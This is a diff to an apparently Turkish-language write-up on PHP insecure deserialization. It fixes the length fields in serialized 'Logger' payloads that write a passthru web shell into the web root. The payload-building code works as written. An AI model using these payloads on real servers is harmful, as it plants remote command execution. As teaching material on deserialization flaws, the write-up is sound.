@@ -106,7 +106,7 @@ $evil->logFile = "/var/www/html/shell.php";
 $evil->exitMsg = "<?php passthru(\$_GET['cmd']); ?>";
 
 echo serialize($evil);
-// O:6:"Logger":2:{s:..:"logFile";s:26:"/var/www/html/shell.php";s:..:"exitMsg";s:33:"<?php passthru($_GET['cmd']); ?>";}
+// O:6:"Logger":2:{s:..:"logFile";s:23:"/var/www/html/shell.php";s:..:"exitMsg";s:32:"<?php passthru($_GET['cmd']); ?>";}
 ```
 
 Bu string `unserialize()` edildiğinde script bitişinde shell.php oluşturulur.
@@ -167,7 +167,7 @@ $obj = new Logger();
 $obj_ref = new ReflectionClass($obj);
 
 // Veya serialize string'i doğrudan oluştur:
-$payload = 'O:6:"Logger":3:{s:15:"' . "\0Logger\0" . 'logFile";s:28:"/var/www/html/img/shell.php";s:15:"' . "\0Logger\0" . 'initMsg";s:0:"";s:14:"' . "\0Logger\0" . 'exitMsg";s:33:"<?php passthru($_GET[\'cmd\']); ?>";}';
+$payload = 'O:6:"Logger":3:{s:15:"' . "\0Logger\0" . 'logFile";s:27:"/var/www/html/img/shell.php";s:15:"' . "\0Logger\0" . 'initMsg";s:0:"";s:15:"' . "\0Logger\0" . 'exitMsg";s:32:"<?php passthru($_GET[\'cmd\']); ?>";}';
 
 echo base64_encode($payload);
 ```
